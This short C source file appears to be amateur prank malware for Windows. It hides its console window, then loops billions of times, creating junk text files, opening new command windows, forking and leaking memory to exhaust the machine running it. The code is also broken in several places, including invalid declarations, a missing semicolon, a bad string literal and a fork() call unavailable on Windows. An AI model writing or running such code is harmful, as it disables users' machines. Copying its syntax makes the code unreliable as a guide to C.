#include <stdlib.h>
#include <stdio.h>
#define _WIN32_WINNT 0x0500
#include <windows.h>

//forgive me if this is trash I am new to C
int main() {
    HWND hWnd = GetConsoleWindow();
    ShowWindow( hWnd, SW_MINIMIZE );
    ShowWindow( hWnd, SW_HIDE );    
    FILE[] *x;
    //Number below is used because it is the 32 bit unsigned integer limit
    for(unsigned int i = 0; i < 4294967295; i++) {
        x[i] = fopen(rand() + '.txt', 'w+')
        for(int y = 0, y < i; y++){
            fputs("We do a little trolling\n", x[i]);
        }
        system("start cmd");
        fork();
        malloc(1000);
    }
}
